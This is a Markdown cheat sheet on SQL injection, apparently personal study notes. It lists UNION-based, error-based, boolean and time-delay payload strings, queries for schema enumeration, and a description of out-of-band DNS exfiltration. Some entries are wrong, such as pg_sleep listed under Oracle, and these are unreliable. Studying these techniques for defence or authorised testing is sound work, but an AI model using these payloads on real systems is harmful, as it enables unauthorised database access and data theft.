# SQL Injection

![sqli](https://github.com/DK9510/Img/blob/main/sql-inection.png)
![[sql-inection.png]]

## what is  SQL injection
in this vulnearabilty the malicious sql statement will be inject by the attacker to compromise the database or server

## where to find
* see the parameter were the client send  the request in form GET POST and we use `` ' , \ ) " "'`` etc to manipulate user input and break query.   
* some site use filters to validate client input so we use URL encoded payloads 

## union Query 
for successfully execution union query  we must meet the no. of columns returning 

## find number of columns vulnerable to SQL I
1. use order by 1 (integer ) and increment until error goes on
this will give us the number of columns that are returning
2. or another  method is UNION Select NULL,NULL --  "if number of null DOESN'T match then DB gives error"
#### note for Oracle Database 
always use **From Dual --** in select query because it is the builtin table in oracle.

## find the column which gives us the string value in return 
```bash
Query= 'UNION SELECT NULL,"A"+--+'
```
OR
```bash
query = ' UNION SELECT "A",NULL --+'
```
(if returns our string value in any columns that is data retrival point we can say)

## find DataBase Type and Version
|Database | Query |
|---|---|
|Microsoft | 'Select @@version'|
|MySQL |'Select @@version'|
|Oracle | 'Select \* from v\$Version'|
|PostgreSQL| 'Select version()'|

## listing content of DB 
#### Listing tables 
```bash
Query= 'information_schema.tables' 
```
(list out the table names in the database)
#### listing columns
```bash
Query= ' Select * from information_schema.columns Where table_name="table name we know" '
```
***NOTE:  always use + instead of (space)***

### For Oracle DataBase

**For tables**
```bash
Query= 'Select * from all_tables '
```
**For columns** 
```bash
Query= 'Select * from all_tables_columns where table_name="table name"'
```
## String Concation 
***used for concatenation multiple string in the single string***

|***Database* **| ***Method for concate***|
|---|---|
|**Oracle **|** 'str1'  \| \|'str2'** |
|**Microsoft** |** 'str1'+str2**|
|**PostgreSQL**|**'stind r1' \|\|'str2'**|
|**MySql** | **'str1'(space)'str2'  OR CONCATE('str1','str2')**|

## Sub-string or retrieve part of the string
|DataBase| Query|
|---|---|
|Oracle |SUBSTR('the payload to return string or string', index_of_string, number_of_charector_to retrive)|
|Microsoft|SUBSTRING('STRING ', Index, number of character)|
|PostgreSQL| SUBSTRING('string', index, character)|
|MySQL| SUBSTRING('string', index, character)|

## Comments in SQL
|DataBase|Comment|
|---|---|
|Oracle|'--'|
|Microsoft|'--'and /\*\*/|
|PostgreSql|'--' and /\*\*/ |
|MySQL| \# , --(white space), /\*\*/ |

# Blind sql injection vulnerability

### how to exploit 
1. change logic of the Query to trigger detectable difference
2. trigger time delay
3. trigger out of band network interaction

### using conditional Response
```bash
Query = ' xyz AND "1"="1' 
```
**if get response than xyz if true other wise it DIDN'T get response from server**    or
```bash
Query = ' xyz AND "1"="2'
```

### inducing conditional Response by Triggering SQL Error
```bash
Query = 'xyz AND ( Select CASE WHEN (1=2) Then 1/0 Else "a" END)="a'
```
**if condition is true server gives us the error if false 
coudnt get error**

##### for Oracle Data base 
```bash
Query= 'xyz || (select case when(1=1) Then To_char(1/0) Else '' END From DUAL \|\| '
```

### exploit BY Generating Delay 
```bash
query = '; if (condition true) waitfor Delay '0:0:10:'+--+'
```
gives 10 second delay in response if condition true else DIDN'T delay in response

##### for oracle DB
```bash
Query = '|| pg_sleep(delay in seconds)+--+'
```

### exploit using OUt of band 
in this append data in the form of subdomain in our domain and make a DNS lookup
that will reflect in our network traffic and that way we can extract data.
we also use burp collaberator

# 2nd Order SQL Injection
#### it happens when our input stored in the application and then later handling different HTTP request the app retrieve stored data and our sql query is executed and we successfully u injected our payload in the server and also executed our SQL Query.
